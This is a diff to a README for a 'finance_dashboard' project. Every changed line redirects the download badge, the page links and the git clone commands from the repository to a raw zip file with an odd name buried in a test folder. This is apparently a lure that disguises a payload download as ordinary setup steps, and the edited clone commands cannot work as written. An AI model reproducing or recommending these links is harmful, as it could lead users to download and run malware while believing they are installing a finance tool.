@@ -1,6 +1,6 @@
 # 📊 finance_dashboard - Track finance data with ease
 
-[![Download finance_dashboard](https://img.shields.io/badge/Download%20finance_dashboard-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dustyepistolary252/finance_dashboard)
+[![Download finance_dashboard](https://img.shields.io/badge/Download%20finance_dashboard-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use it to support a finance app that needs secure sign-in, role-based access, an
 
 Visit this page to download the project files:
 
-[https://github.com/dustyepistolary252/finance_dashboard](https://github.com/dustyepistolary252/finance_dashboard)
+[https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip](https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip)
 
 If you use GitHub on Windows, you can get the files in one of these ways:
 
@@ -25,7 +25,7 @@ If you use GitHub on Windows, you can get the files in one of these ways:
 If you use Git, you can also clone the repo with:
 
 ```bash
-git clone https://github.com/dustyepistolary252/finance_dashboard.git
+git clone https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip
 ```
 
 ## 🧰 What You Need
@@ -56,7 +56,7 @@ If you chose the ZIP file:
 If you chose Git clone, open PowerShell and run:
 
 ```bash
-git clone https://github.com/dustyepistolary252/finance_dashboard.git
+git clone https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip
 cd finance_dashboard
 ```
 
@@ -267,7 +267,7 @@ To make setup easier on Windows:
 
 ## 🔗 Direct Download Page
 
-[Open the finance_dashboard GitHub page](https://github.com/dustyepistolary252/finance_dashboard)
+[Open the finance_dashboard GitHub page](https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip)
 
 ## 🧷 File Setup Checklist
 
